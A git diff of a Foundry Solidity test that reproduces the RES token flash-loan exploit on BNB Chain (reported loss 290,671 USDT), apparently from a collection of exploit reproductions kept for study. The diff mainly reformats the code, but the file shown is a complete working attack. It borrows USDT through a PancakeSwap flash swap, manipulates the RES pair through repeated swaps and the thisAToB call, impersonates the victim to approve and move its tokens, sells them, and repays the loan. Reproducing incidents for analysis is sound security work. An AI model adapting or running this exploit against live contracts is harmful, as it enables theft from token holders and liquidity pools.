@@ -2,8 +2,11 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IUSDT} from "src/interfaces/IUSDT.sol";
+import {IPancakeRouter} from "src/interfaces/IPancakeRouter.sol";
+import {IPancakePair} from "src/interfaces/IPancakePair.sol";
 // @KeyInfo - Total Lost : 290,671 USDT
 // Attacker : 0x986b2e2a1cf303536138d8ac762447500fd781c6
 // Attack Contract : https://bscscan.com/address/0xFf333DE02129AF88aAe101ab777d3f5D709FeC6f
@@ -21,19 +24,22 @@ import "./../interface.sol";
 // Article QuillAudits : https://quillaudits.medium.com/res-token-290k-flash-loan-exploit-quillaudits-9300657fff7b
 
 interface IRES is IERC20 {
-
     function thisAToB() external;
-
 }
 
 contract ContractTest is Test {
-
-    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
-    IERC20 constant ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
-    IPancakeRouter constant PS_ROUTER = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    IPancakePair constant USDT_WBNB_PAIR = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
-    IPancakePair constant USDT_RES_PAIR = IPancakePair(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
-    IPancakePair constant USDT_ALL_PAIR = IPancakePair(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
+    IUSDT constant USDT_TOKEN =
+        IUSDT(0x55d398326f99059fF775485246999027B3197955);
+    IERC20 constant ALL_TOKEN =
+        IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
+    IPancakeRouter constant PS_ROUTER =
+        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IPancakePair constant USDT_WBNB_PAIR =
+        IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
+    IPancakePair constant USDT_RES_PAIR =
+        IPancakePair(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
+    IPancakePair constant USDT_ALL_PAIR =
+        IPancakePair(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
     IRES constant RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
 
     function setUp() public {
@@ -47,7 +53,10 @@ contract ContractTest is Test {
         vm.label(address(RES_TOKEN), "RES_TOKEN");
     }
 
-    function stringsEquals(bytes calldata s1, string memory s2) private pure returns (bool) {
+    function stringsEquals(
+        bytes calldata s1,
+        string memory s2
+    ) private pure returns (bool) {
         bytes memory b1 = bytes(s1);
         bytes memory b2 = bytes(s2);
 
@@ -61,20 +70,36 @@ contract ContractTest is Test {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "[Start] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
+            "[Start] Attacker USDT balance before exploit",
+            USDT_TOKEN.balanceOf(address(this)),
+            18
         );
 
-        USDT_WBNB_PAIR.swap(10_014_120_886_666_860_414_836_616, 0, address(this), "borrowusdt");
+        USDT_WBNB_PAIR.swap(
+            10_014_120_886_666_860_414_836_616,
+            0,
+            address(this),
+            "borrowusdt"
+        );
 
         emit log_named_decimal_uint(
-            "[End] Attacker USDT balance after exploit", USDT_TOKEN.balanceOf(address(this)), 18
+            "[End] Attacker USDT balance after exploit",
+            USDT_TOKEN.balanceOf(address(this)),
+            18
         );
     }
 
-    function pancakeCall(address, /*sender*/ uint256 amount0, uint256, /*amount1*/ bytes calldata data) external {
+    function pancakeCall(
+        address,
+        /*sender*/ uint256 amount0,
+        uint256,
+        /*amount1*/ bytes calldata data
+    ) external {
         if (stringsEquals(data, "borrowusdt")) {
             emit log_named_decimal_uint(
-                "[Flashloan] now Attacker USDT balance is", USDT_TOKEN.balanceOf(address(this)), 18
+                "[Flashloan] now Attacker USDT balance is",
+                USDT_TOKEN.balanceOf(address(this)),
+                18
             );
 
             USDT_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
@@ -85,44 +110,94 @@ contract ContractTest is Test {
 
             emit log_named_decimal_uint(
                 "[FlashLoan] Res Token Balance of address(user)",
-                RES_TOKEN.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229)),
+                RES_TOKEN.balanceOf(
+                    address(0x3F693Effc53908d517F186A20431f756C90c2229)
+                ),
                 8
             );
 
-            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 476_862_899_365_088_591_182_696);
+            USDT_TOKEN.transfer(
+                address(USDT_RES_PAIR),
+                476_862_899_365_088_591_182_696
+            );
 
             // use flashswap will get more than buy
-            USDT_RES_PAIR.swap(0, 71_519_292_481_906, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");
+            USDT_RES_PAIR.swap(
+                0,
+                71_519_292_481_906,
+                address(0x3F693Effc53908d517F186A20431f756C90c2229),
+                ""
+            );
 
             console.log("[FlashLoan] swap 1 over");
 
-            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 953_725_798_730_177_182_365_392);
+            USDT_TOKEN.transfer(
+                address(USDT_RES_PAIR),
+                953_725_798_730_177_182_365_392
+            );
 
-            USDT_RES_PAIR.swap(0, 22_030_478_307_020, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");
+            USDT_RES_PAIR.swap(
+                0,
+                22_030_478_307_020,
+                address(0x3F693Effc53908d517F186A20431f756C90c2229),
+                ""
+            );
 
             console.log("[FlashLoan] swap 2 over");
 
-            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 1_430_588_698_095_265_773_548_088);
+            USDT_TOKEN.transfer(
+                address(USDT_RES_PAIR),
+                1_430_588_698_095_265_773_548_088
+            );
 
-            USDT_RES_PAIR.swap(0, 7_810_673_572_823, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");
+            USDT_RES_PAIR.swap(
+                0,
+                7_810_673_572_823,
+                address(0x3F693Effc53908d517F186A20431f756C90c2229),
+                ""
+            );
 
             console.log("[FlashLoan] swap 3 over");
 
-            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 1_907_451_597_460_354_364_730_784);
+            USDT_TOKEN.transfer(
+                address(USDT_RES_PAIR),
+                1_907_451_597_460_354_364_730_784
+            );
 
-            USDT_RES_PAIR.swap(0, 3_504_534_400_905, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");
+            USDT_RES_PAIR.swap(
+                0,
+                3_504_534_400_905,
+                address(0x3F693Effc53908d517F186A20431f756C90c2229),
+                ""
+            );
 
             console.log("[FlashLoan] swap 4 over");
 
-            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 2_384_314_496_825_442_955_913_480);
+            USDT_TOKEN.transfer(
+                address(USDT_RES_PAIR),
+                2_384_314_496_825_442_955_913_480
+            );
 
-            USDT_RES_PAIR.swap(0, 1_845_944_923_363, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");
+            USDT_RES_PAIR.swap(
+                0,
+                1_845_944_923_363,
+                address(0x3F693Effc53908d517F186A20431f756C90c2229),
+                ""
+            );
 
             console.log("[FlashLoan] swap 5 over");
 
-            USDT_TOKEN.transfer(address(USDT_RES_PAIR), 2_861_177_396_190_531_547_096_176);
+            USDT_TOKEN.transfer(
+                address(USDT_RES_PAIR),
+                2_861_177_396_190_531_547_096_176
+            );
 
-            USDT_RES_PAIR.swap(0, 1_084_945_873_965, address(0x3F693Effc53908d517F186A20431f756C90c2229), "");
+            USDT_RES_PAIR.swap(
+                0,
+                1_084_945_873_965,
+                address(0x3F693Effc53908d517F186A20431f756C90c2229),
+                ""
+            );
 
             console.log("[FlashLoan] swap 6 over");
 
@@ -136,43 +211,72 @@ contract ContractTest is Test {
             vm.prank(0x3F693Effc53908d517F186A20431f756C90c2229);
             ALL_TOKEN.approve(address(this), type(uint256).max);
 
-            uint256 res_balance = RES_TOKEN.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229));
+            uint256 res_balance = RES_TOKEN.balanceOf(
+                address(0x3F693Effc53908d517F186A20431f756C90c2229)
+            );
 
-            emit log_named_decimal_uint("[FlashLoan] Res Token Balance of address(user)", res_balance, 8);
+            emit log_named_decimal_uint(
+                "[FlashLoan] Res Token Balance of address(user)",
+                res_balance,
+                8
+            );
 
             emit log_named_decimal_uint(
                 "[FlashLoan] All Token Balance of address(user)",
-                ALL_TOKEN.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229)),
+                ALL_TOKEN.balanceOf(
+                    address(0x3F693Effc53908d517F186A20431f756C90c2229)
+                ),
                 18
             );
 
-            uint256 alltoken_balance = ALL_TOKEN.balanceOf(address(0x3F693Effc53908d517F186A20431f756C90c2229));
+            uint256 alltoken_balance = ALL_TOKEN.balanceOf(
+                address(0x3F693Effc53908d517F186A20431f756C90c2229)
+            );
 
-            ALL_TOKEN.transferFrom(0x3F693Effc53908d517F186A20431f756C90c2229, address(USDT_ALL_PAIR), alltoken_balance);
+            ALL_TOKEN.transferFrom(
+                0x3F693Effc53908d517F186A20431f756C90c2229,
+                address(USDT_ALL_PAIR),
+                alltoken_balance
+            );
 
             console.log("transfer all token over");
 
-            (uint256 reserve0, uint256 reserve1,) = USDT_ALL_PAIR.getReserves();
+            (uint256 reserve0, uint256 reserve1, ) = USDT_ALL_PAIR
+                .getReserves();
 
-            uint256 get_value = (alltoken_balance * reserve1) / (alltoken_balance + reserve0);
+            uint256 get_value = (alltoken_balance * reserve1) /
+                (alltoken_balance + reserve0);
 
-            uint256 getusdamount = get_value - ((get_value * 10 / 10_000));
+            uint256 getusdamount = get_value - (((get_value * 10) / 10_000));
 
             USDT_ALL_PAIR.swap(0, getusdamount, address(this), "");
 
             emit log_named_decimal_uint(
-                "[FlashLoan] sell Alltoken over, Attacker usdt balance is", USDT_TOKEN.balanceOf(address(this)), 18
+                "[FlashLoan] sell Alltoken over, Attacker usdt balance is",
+                USDT_TOKEN.balanceOf(address(this)),
+                18
             );
 
-            RES_TOKEN.transferFrom(0x3F693Effc53908d517F186A20431f756C90c2229, address(USDT_RES_PAIR), res_balance);
+            RES_TOKEN.transferFrom(
+                0x3F693Effc53908d517F186A20431f756C90c2229,
+                address(USDT_RES_PAIR),
+                res_balance
+            );
 
-            USDT_RES_PAIR.swap(1_905_851_854_454_828_201_052_166, 0, address(this), "");
+            USDT_RES_PAIR.swap(
+                1_905_851_854_454_828_201_052_166,
+                0,
+                address(this),
+                ""
+            );
 
             emit log_named_decimal_uint(
-                "[FlashLoan] sell Restoken over, Attacker usdt balance is", USDT_TOKEN.balanceOf(address(this)), 18
+                "[FlashLoan] sell Restoken over, Attacker usdt balance is",
+                USDT_TOKEN.balanceOf(address(this)),
+                18
             );
 
-            uint256 refund = amount0 + ((amount0 * 251 / 100_000));
+            uint256 refund = amount0 + (((amount0 * 251) / 100_000));
             USDT_TOKEN.transfer(address(USDT_WBNB_PAIR), refund);
         } else {
             console.log("error");
@@ -180,5 +284,4 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
-
 }
